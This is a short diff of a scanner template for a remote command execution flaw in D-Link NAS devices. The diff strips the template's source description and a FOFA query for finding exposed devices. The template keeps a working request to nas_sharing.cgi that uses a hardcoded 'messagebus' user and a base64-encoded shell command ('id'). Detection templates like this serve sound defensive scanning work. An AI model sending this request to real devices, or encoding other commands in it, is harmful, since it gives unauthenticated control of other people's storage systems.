@@ -3,12 +3,8 @@ info:
   name: D-Link NAS设备nas_sharing.cgi接口 远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ga481wrogs4yh3ma'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ga481wrogs4yh3ma
-    fofa: body="Text:In order to access the ShareCenter"
 http:
 - raw:
   - 'GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWQ= HTTP/1.1
